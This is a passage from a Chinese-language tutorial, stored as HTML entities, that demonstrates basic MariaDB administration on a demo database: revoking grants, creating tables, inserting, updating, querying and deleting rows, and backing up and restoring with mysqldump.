sec)&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x9664;&#x4E86;&#x79FB;&#x9664;&#x6388;&#x6743;&#x7684;&#x547D;&#x4EE4;&#xFF08;revoke&#xFF09;&#x4E0E;&#x6388;&#x6743;&#x547D;&#x4EE4;&#xFF08;grant&#xFF09;&#x4E0D;&#x540C;&#x4E4B;&#x5916;&#xFF0C;&#x5176;&#x4F59;&#x90E8;&#x5206;&#x90FD;&#x662F;&#x4E00;&#x81F4;&#x7684;&#x3002;&#x8FD9;&#x4E0D;&#x4EC5;&#x597D;&#x8BB0;&#x800C;&#x4E14;&#x4E5F;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x3002;&#x6267;&#x884C;&#x79FB;&#x9664;&#x6388;&#x6743;&#x547D;&#x4EE4;&#x540E;&#xFF0C;&#x518D;&#x6765;&#x67E5;&#x770B;&#x8D26;&#x6237;jaking&#x7684;&#x4FE1;&#x606F;&#xFF1A;MariaDB [(none)]&gt; SHOW GRANTS FOR jaking@localhost;+-------------------------------------------------------------------------------------------------------------+| Grants for jaking@localhost |+-------------------------------------------------------------------------------------------------------------+| GRANT USAGE ON *.* TO &apos;jaking&apos;@&apos;localhost&apos; IDENTIFIED BY PASSWORD &apos;*55D9962586BE75F4B7D421E6655973DB07D6869F&apos; |+-------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)MariaDB [mysql]&gt; exitBye[root@localhost ~]# mysql -u jaking -pjakingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 19Server version: 5.5.52-MariaDB MariaDB ServerCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; show databases;+--------------------+| Database |+--------------------+| information_schema |+--------------------+1 row in set (0.00 sec)MariaDB [(none)]&gt; 4. &#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x4E0E;&#x8868;&#x5355;&#x5728;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x4EE5;&#x5B58;&#x653E;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x8868;&#xFF0C;&#x6570;&#x636E;&#x8868;&#x5355;&#x662F;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x6700;&#x91CD;&#x8981;&#x6700;&#x6838;&#x5FC3;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x7684;&#x9700;&#x6C42;&#x81EA;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x5E93;&#x8868;&#x7ED3;&#x6784;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x5176;&#x4E2D;&#x5408;&#x7406;&#x5730;&#x5B58;&#x653E;&#x6570;&#x636E;&#xFF0C;&#x4EE5;&#x4FBF;&#x540E;&#x671F;&#x8F7B;&#x677E;&#x5730;&#x7EF4;&#x62A4;&#x548C;&#x4FEE;&#x6539;&#x3002;&#x8868;2&#x7F57;&#x5217;&#x4E86;&#x540E;&#x6587;&#x4E2D;&#x5C06;&#x4F7F;&#x7528;&#x5230;&#x7684;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x4F5C;&#x7528;&#x3002; &#x8868;2. &#x7528;&#x4E8E;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x7684;&#x547D;&#x4EE4;&#x4EE5;&#x53CA;&#x4F5C;&#x7528; &#x7528;&#x6CD5; &#x4F5C;&#x7528; CREATE database &#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;; &#x521B;&#x5EFA;&#x65B0;&#x7684;&#x6570;&#x636E;&#x5E93; DESCRIBE &#x8868;&#x5355;&#x540D;&#x79F0;; &#x63CF;&#x8FF0;&#x8868;&#x5355; UPDATE &#x8868;&#x5355;&#x540D;&#x79F0; SET col=&#x65B0;&#x503C; WHERE col &gt; &#x539F;&#x59CB;&#x503C; &#x66F4;&#x65B0;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x6570;&#x636E; USE &#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;; &#x6307;&#x5B9A;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93; SHOW databases; &#x663E;&#x793A;&#x5F53;&#x524D;&#x5DF2;&#x6709;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5E93; SHOW TABLES; &#x663E;&#x793A;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#x5355; SELECT * FROM &#x8868;&#x5355;&#x540D;&#x79F0;; &#x4ECE;&#x8868;&#x5355;&#x4E2D;&#x9009;&#x4E2D;&#x67D0;&#x4E2A;&#x8BB0;&#x5F55;&#x503C; DELETE FROM &#x8868;&#x5355;&#x540D; WHERE col=&#x503C;; &#x4ECE;&#x8868;&#x5355;&#x6C47;&#x603B;&#x5220;&#x9664;&#x67D0;&#x4E2A;&#x8BB0;&#x5F55;&#x503C; &#x5EFA;&#x7ACB;&#x6570;&#x636E;&#x5E93;&#x662F;&#x7BA1;&#x7406;&#x6570;&#x636E;&#x7684;&#x8D77;&#x70B9;&#x3002;&#x73B0;&#x5728;&#x5C1D;&#x8BD5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;jaking&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x5217;&#x8868;&#xFF0C;&#x6B64;&#x65F6;&#x5C31;&#x80FD;&#x770B;&#x5230;&#x5B83;&#x4E86;&#xFF1A;123456789101112MariaDB [(none)]&gt; CREATE DATABASE jaking;Query OK, 1 row affected (0.00 sec)MariaDB [(none)]&gt; SHOW databases;+--------------------+| Database&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+--------------------+| information_schema || jaking&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || mysql&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || performance_schema |+--------------------+4 rows in set (0.04 sec) &#x8981;&#x60F3;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x8868;&#x5355;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5207;&#x6362;&#x5230;&#x67D0;&#x4E2A;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x3002;&#x6BD4;&#x5982;&#x5728;&#x65B0;&#x5EFA;&#x7684;jaking&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x521B;&#x5EFA;&#x8868;&#x5355;mybook&#xFF0C;&#x7136;&#x540E;&#x8FDB;&#x884C;&#x8868;&#x5355;&#x7684;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x5373;&#x5B9A;&#x4E49;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x5185;&#x5BB9;&#x7684;&#x7ED3;&#x6784;&#x3002;&#x6211;&#x4EEC;&#x5206;&#x522B;&#x5B9A;&#x4E49;3&#x4E2A;&#x5B57;&#x6BB5;&#x9879;&#xFF0C;&#x5176;&#x4E2D;&#xFF0C;&#x957F;&#x5EA6;&#x4E3A;15&#x4E2A;&#x5B57;&#x7B26;&#x7684;&#x5B57;&#x7B26;&#x578B;&#x5B57;&#x6BB5;name&#x7528;&#x6765;&#x5B58;&#x653E;&#x56FE;&#x4E66;&#x540D;&#x79F0;&#xFF0C;&#x6574;&#x578B;&#x5B57;&#x6BB5;price&#x548C;pages&#x5206;&#x522B;&#x5B58;&#x50A8;&#x56FE;&#x4E66;&#x7684;&#x4EF7;&#x683C;&#x548C;&#x9875;&#x6570;&#x3002;&#x5F53;&#x6267;&#x884C;&#x5B8C;&#x4E0B;&#x8FF0;&#x547D;&#x4EE4;&#x4E4B;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8868;&#x5355;&#x7684;&#x7ED3;&#x6784;&#x4FE1;&#x606F;&#x4E86;&#xFF1A; 12345678910111213MariaDB [(none)]&gt; use jaking;Database changedMariaDB [jaking]&gt; CREATE TABLE mybook (name char(15),price int,pages int);Query OK, 0 rows affected (0.16 sec)MariaDB [jaking]&gt; DESCRIBE mybook;+-------+----------+------+-----+---------+-------+| Field | Type&#xA0;&#xA0;&#xA0;&#xA0; | Null | Key | Default | Extra |+-------+----------+------+-----+---------+-------+| name&#xA0; | char(15) | YES&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0; | NULL&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || price | int(11)&#xA0; | YES&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0; | NULL&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || pages | int(11)&#xA0; | YES&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0; | NULL&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;|+-------+----------+------+-----+---------+-------+3 rows in set (0.02 sec) 5 &#x7BA1;&#x7406;&#x8868;&#x5355;&#x53CA;&#x6570;&#x636E;&#x63A5;&#x4E0B;&#x6765;&#x5411;mybook&#x6570;&#x636E;&#x8868;&#x5355;&#x4E2D;&#x63D2;&#x4E00;&#x6761;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x3002;&#x4E3A;&#x6B64;&#x9700;&#x8981;&#x4F7F;&#x7528;INSERT&#x547D;&#x4EE4;&#xFF0C;&#x5E76;&#x5728;&#x547D;&#x4EE4;&#x4E2D;&#x5199;&#x6E05;&#x8868;&#x5355;&#x540D;&#x79F0;&#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x5B57;&#x6BB5;&#x9879;&#x3002;&#x6267;&#x884C;&#x8BE5;&#x547D;&#x4EE4;&#x4E4B;&#x540E;&#x5373;&#x53EF;&#x5B8C;&#x6210;&#x56FE;&#x4E66;&#x5199;&#x5165;&#x4FE1;&#x606F;&#x3002;&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x8BE5;&#x547D;&#x4EE4;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#xFF0C;&#x5176;&#x4E2D;&#x4E66;&#x540D;&#x4E3A;jaking&#xFF0C;&#x4EF7;&#x683C;&#x548C;&#x9875;&#x6570;&#x5206;&#x522B;&#x662F;60&#x5143;&#x548C;518&#x9875;&#x3002;&#x5728;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x540E;&#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x5DF2;&#x7ECF;&#x6210;&#x529F;&#x5199;&#x5165;&#x5230;&#x6570;&#x636E;&#x8868;&#x5355;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x4E86;&#x3002;&#x6211;&#x4EEC;&#x5728;&#x4F7F;&#x7528;select&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x8868;&#x5355;&#x5185;&#x5BB9;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x52A0;&#x4E0A;&#x60F3;&#x8981;&#x67E5;&#x8BE2;&#x7684;&#x5B57;&#x6BB5;&#xFF1B;&#x5982;&#x679C;&#x60F3;&#x67E5;&#x770B;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5185;&#x5BB9;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x661F;&#x53F7;&#xFF08;*&#xFF09;&#x901A;&#x914D;&#x7B26;&#x6765;&#x663E;&#x793A;&#xFF1A; 123456789MariaDB [jaking]&gt; INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking&apos;,&apos;60&apos;, &apos;518&apos;);Query OK, 1 row affected (0.00 sec)MariaDB [jaking]&gt; select * from mybook;+------------+-------+-------+| name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | price | pages |+------------+-------+-------+| jaking |&#xA0;&#xA0;&#xA0; 60 |&#xA0;&#xA0; 518 |+------------+-------+-------+1 rows in set (0.01 sec) &#x5BF9;&#x6570;&#x636E;&#x5E93;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x6765;&#x8BB2;&#xFF0C;&#x9700;&#x8981;&#x505A;&#x597D;&#x56DB;&#x95E8;&#x529F;&#x8BFE;&#x2014;&#x589E;&#x3001;&#x5220;&#x3001;&#x6539;&#x3001;&#x67E5;&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x8868;&#x5355;&#x5E76;&#x5728;&#x5176;&#x4E2D;&#x63D2;&#x5165;&#x5185;&#x5BB9;&#x4EC5;&#x4EC5;&#x662F;&#x7B2C;&#x4E00;&#x6B65;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x638C;&#x63E1;&#x6570;&#x636E;&#x8868;&#x5355;&#x5185;&#x5BB9;&#x7684;&#x4FEE;&#x6539;&#x65B9;&#x6CD5;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;update&#x547D;&#x4EE4;&#x5C06;&#x521A;&#x624D;&#x63D2;&#x5165;&#x7684;jaking&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x7684;&#x4EF7;&#x683C;&#x4FEE;&#x6539;&#x4E3A;55&#x5143;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x4F7F;&#x7528;select&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x8BE5;&#x56FE;&#x4E66;&#x7684;&#x540D;&#x79F0;&#x548C;&#x5B9A;&#x4EF7;&#x4FE1;&#x606F;&#x3002;&#x6CE8;&#x610F;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&#x53EA;&#x67E5;&#x770B;&#x56FE;&#x4E66;&#x7684;&#x540D;&#x79F0;&#x548C;&#x5B9A;&#x4EF7;&#xFF0C;&#x800C;&#x4E0D;&#x6D89;&#x53CA;&#x9875;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x987B;&#x518D;&#x7528;&#x661F;&#x53F7;&#x901A;&#x914D;&#x7B26;&#x6765;&#x663E;&#x793A;&#x6240;&#x6709;&#x5185;&#x5BB9;&#x3002; 12345678910MariaDB [jaking]&gt; UPDATE mybook SET price=55 ;Query OK, 1 row affected (0.00 sec)Rows matched: 1&#xA0; Changed: 1&#xA0; Warnings: 0MariaDB [jaking]&gt; SELECT name,price FROM mybook;+------------+-------+| name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | price |+------------+-------+| jaking |&#xA0;&#xA0;&#xA0; 55 |+------------+-------+1 row in set (0.00 sec) &#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;delete&#x547D;&#x4EE4;&#x5220;&#x9664;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x4F7F;&#x7528;delete&#x547D;&#x4EE4;&#x5220;&#x9664;&#x6570;&#x636E;&#x8868;&#x5355;mybook&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5185;&#x5BB9;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x67E5;&#x770B;&#x8BE5;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8BE5;&#x8868;&#x5355;&#x5185;&#x5BB9;&#x4E3A;&#x7A7A;&#x4E86;&#x3002; 1234MariaDB [jaking]&gt; DELETE FROM mybook;Query OK, 1 row affected (0.01 sec)MariaDB [jaking]&gt; SELECT * FROM mybook;Empty set (0.00 sec) &#x4E00;&#x822C;&#x6765;&#x8BB2;&#xFF0C;&#x6570;&#x636E;&#x8868;&#x5355;&#x4E2D;&#x4F1A;&#x5B58;&#x653E;&#x6210;&#x5343;&#x4E0A;&#x4E07;&#x6761;&#x6570;&#x636E;&#x4FE1;&#x606F;&#x3002;&#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x521A;&#x521A;&#x521B;&#x5EFA;&#x7684;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x7684;mybook&#x8868;&#x5355;&#xFF0C;&#x968F;&#x7740;&#x65F6;&#x95F4;&#x7684;&#x63A8;&#x79FB;&#xFF0C;&#x91CC;&#x9762;&#x7684;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x4E5F;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#x3002;&#x5728;&#x8FD9;&#x6837;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x53EA;&#x60F3;&#x67E5;&#x770B;&#x5176;&#x4EF7;&#x683C;&#x5927;&#x4E8E;&#x67D0;&#x4E2A;&#x6570;&#x503C;&#x7684;&#x56FE;&#x4E66;&#x65F6;&#xFF0C;&#x53C8;&#x8BE5;&#x5982;&#x4F55;&#x5B9A;&#x4E49;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x5462;&#xFF1F;&#x4E0B;&#x9762;&#x5148;&#x4F7F;&#x7528;insert&#x63D2;&#x5165;&#x547D;&#x4EE4;&#x4F9D;&#x6B21;&#x63D2;&#x5165;4&#x6761;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#xFF1A; 1234INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking1&apos;,&apos;30&apos;,&apos;518&apos;);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking2&apos;,&apos;50&apos;,&apos;518&apos;);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking3&apos;,&apos;80&apos;,&apos;518&apos;);INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking4&apos;,&apos;100&apos;,&apos;518&apos;); &#x8981;&#x60F3;&#x8BA9;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x66F4;&#x52A0;&#x7CBE;&#x51C6;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x7ED3;&#x5408;&#x4F7F;&#x7528;select&#x4E0E;where&#x547D;&#x4EE4;&#x4E86;&#x3002;&#x5176;&#x4E2D;&#xFF0C;where&#x547D;&#x4EE4;&#x662F;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x8FDB;&#x884C;&#x5339;&#x914D;&#x67E5;&#x8BE2;&#x7684;&#x6761;&#x4EF6;&#x547D;&#x4EE4;&#x3002;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x4EC5;&#x67E5;&#x627E;&#x51FA;&#x7B26;&#x5408;&#x8BE5;&#x6761;&#x4EF6;&#x7684;&#x6570;&#x636E;&#x3002;&#x8868;3&#x5217;&#x51FA;&#x4E86;where&#x547D;&#x4EE4;&#x4E2D;&#x5E38;&#x7528;&#x7684;&#x67E5;&#x8BE2;&#x53C2;&#x6570;&#x4EE5;&#x53CA;&#x4F5C;&#x7528;&#x3002; &#x8868;3. where&#x547D;&#x4EE4;&#x4E2D;&#x4F7F;&#x7528;&#x7684;&#x53C2;&#x6570;&#x4EE5;&#x53CA;&#x4F5C;&#x7528; &#x53C2;&#x6570; &#x4F5C;&#x7528; = &#x76F8;&#x7B49; &lt;&gt; &#x6216; != &#x4E0D;&#x76F8;&#x7B49; &gt; &#x5927;&#x4E8E; &lt; &#x5C0F;&#x4E8E; &gt;= &#x5927;&#x4E8E;&#x6216;&#x7B49;&#x4E8E; &lt;= &#x5C0F;&#x4E8E;&#x6216;&#x7B49;&#x4E8E; BETWEEN &#x5728;&#x67D0;&#x4E2A;&#x8303;&#x56F4;&#x5185; LIKE &#x641C;&#x7D22;&#x4E00;&#x4E2A;&#x4F8B;&#x5B50; IN &#x5728;&#x5217;&#x4E2D;&#x641C;&#x7D22;&#x591A;&#x4E2A;&#x503C; &#x73B0;&#x5728;&#x8FDB;&#x5165;&#x52A8;&#x624B;&#x73AF;&#x8282;&#x3002;&#x5206;&#x522B;&#x5728;mybook&#x8868;&#x5355;&#x4E2D;&#x67E5;&#x627E;&#x51FA;&#x4EF7;&#x683C;&#x5927;&#x4E8E;75&#x5143;&#x6216;&#x4EF7;&#x683C;&#x4E0D;&#x7B49;&#x4E8E;80&#x5143;&#x7684;&#x56FE;&#x4E66;&#xFF0C;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x3002;&#x5728;&#x719F;&#x6089;&#x4E86;&#x8FD9;&#x4E24;&#x4E2A;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x4E4B;&#x540E;&#xFF0C;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x81EA;&#x884C;&#x5C1D;&#x8BD5;&#x7CBE;&#x786E;&#x67E5;&#x627E;&#x56FE;&#x4E66;&#x540D;&#x4E3A;jaking2&#x7684;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x3002; 12345678910111213141516171819MariaDB [jaking]&gt; SELECT * FROM mybook WHERE price&gt;75;+-------------+-------+-------+| name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | price | pages |+-------------+-------+-------+| jaking3 |&#xA0;&#xA0;&#xA0; 80 |&#xA0;&#xA0; 518 || jaking4 |&#xA0;&#xA0; 100 |&#xA0;&#xA0; 518 |+-------------+-------+-------+2 rows in set (0.06 sec)MariaDB [jaking]&gt; SELECT * FROM mybook WHERE price!=80;+-------------+-------+-------+| name | price | pages&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+-------------+-------+-------+| jaking1&#xA0; | 30&#xA0; | 518&#xA0;&#xA0;&#xA0; || jaking2&#xA0; | 50&#xA0; | 518&#xA0;&#xA0;&#xA0; || jaking4&#xA0; | 100 | 518&#xA0;&#xA0;&#xA0; |+-------------+-------+-------+3 rows in set (0.01 sec)MariaDB [mysql]&gt; exitBye 6 &#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x53CA;&#x6062;&#x590D;&#x524D;&#x6587;&#x63D0;&#x5230;&#xFF0C;&#x672C;&#x4E66;&#x7684;&#x6280;&#x672F;&#x4E3B;&#x7EBF;&#x662F;Linux&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x7EF4;&#x65B9;&#x5411;&#xFF0C;&#x4E0D;&#x4F1A;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x7684;&#x64CD;&#x4F5C;&#x8FDB;&#x884C;&#x6DF1;&#x5165;&#x7684;&#x8BB2;&#x89E3;&#xFF0C;&#x56E0;&#x6B64;&#x5927;&#x5BB6;&#x638C;&#x63E1;&#x4E86;&#x4E0A;&#x9762;&#x8FD9;&#x4E9B;&#x57FA;&#x672C;&#x7684;&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#x4E4B;&#x540E;&#x5C31;&#x8DB3;&#x591F;&#x4E86;&#x3002;&#x4E0B;&#x9762;&#x8981;&#x8BB2;&#x89E3;&#x7684;&#x662F;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x4EE5;&#x53CA;&#x6062;&#x590D;&#xFF0C;&#x8FD9;&#x4E9B;&#x77E5;&#x8BC6;&#x6BD4;&#x8F83;&#x5B9E;&#x7528;&#xFF0C;&#x5E0C;&#x671B;&#x5927;&#x5BB6;&#x80FD;&#x591F;&#x638C;&#x63E1;&#x3002;mysqldump&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x6570;&#x636E;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;mysqldump [&#x53C2;&#x6570;] [&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;]&#x201D;&#x3002;&#x5176;&#x4E2D;&#x53C2;&#x6570;&#x4E0E;mysql&#x547D;&#x4EE4;&#x5927;&#x81F4;&#x76F8;&#x540C;&#xFF0C;-u&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x767B;&#x5F55;&#x6570;&#x636E;&#x5E93;&#x7684;&#x8D26;&#x6237;&#x540D;&#x79F0;&#xFF0C;-p&#x53C2;&#x6570;&#x4EE3;&#x8868;&#x5BC6;&#x7801;&#x63D0;&#x793A;&#x7B26;&#x3002;&#x4E0B;&#x9762;&#x5C06;jaking&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x5BFC;&#x51FA;&#x6210;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4FDD;&#x5B58;&#x5230;root&#x7BA1;&#x7406;&#x5458;&#x7684;&#x5BB6;&#x76EE;&#x5F55;&#x4E2D;&#xFF1A; [root@jaking ~]# mysqldump -u root -p jaking &gt; /root/jakingDB.dump Enter password:&#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801; &#x7136;&#x540E;&#x8FDB;&#x5165;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x5F7B;&#x5E95;&#x5220;&#x9664;jaking&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x8FD9;&#x6837;mybook&#x6570;&#x636E;&#x8868;&#x5355;&#x4E5F;&#x5C06;&#x88AB;&#x5F7B;&#x5E95;&#x5220;&#x9664;&#x3002;&#x7136;&#x540E;&#x91CD;&#x65B0;&#x5EFA;&#x7ACB;jaking&#x6570;&#x636E;&#x5E93;&#xFF1A; 12345678910111213MariaDB [(none)]&gt; DROP DATABASE jaking;Query OK, 1 row affected (0.04 sec)MariaDB [(none)]&gt; SHOW databases;+--------------------+| Database&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+--------------------+| information_schema || mysql&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || performance_schema |+--------------------+3 rows in set (0.02 sec)MariaDB [(none)]&gt; CREATE DATABASE jaking;Query OK, 1 row affected (0.00 sec) &#x63A5;&#x4E0B;&#x6765;&#x662F;&#x89C1;&#x8BC1;&#x6570;&#x636E;&#x6062;&#x590D;&#x6548;&#x679C;&#x7684;&#x65F6;&#x523B;&#xFF01;&#x4F7F;&#x7528;&#x8F93;&#x5165;&#x91CD;&#x5B9A;&#x5411;&#x7B26;&#x628A;&#x521A;&#x521A;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x5BFC;&#x5165;&#x5230;mysql&#x547D;&#x4EE4;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;&#x8BE5;&#x547D;&#x4EE4;&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x767B;&#x5F55;&#x5230;MariaDB&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5C31;&#x53C8;&#x80FD;&#x770B;&#x5230;jaking&#x6570;&#x636E;&#x5E93;&#x4EE5;&#x53CA;mybook&#x6570;&#x636E;&#x8868;&#x5355;&#x4E86;&#x3002;&#x6570;&#x636E;&#x5E93;&#x6062;&#x590D;&#x6210;&#x529F;&#xFF01; 123456789101112131415161718192021222324252627282930313233343536[root@jaking ~]# mysql -u root -p jaking &lt; /root/jakingDB.dump Enter password: &#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;[root@jaking ~]# mysql -u root -pEnter password: &#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;MariaDB [(none)]&gt; use jaking;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [jaking]&gt; SHOW tables;+----------------------+| Tables_in_jaking |+----------------------+| mybook&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+----------------------+1 row in set (0.05 sec)MariaDB [jaking]&gt; DESCRIBE mybook;+-------+----------+------+-----+---------+-------+| 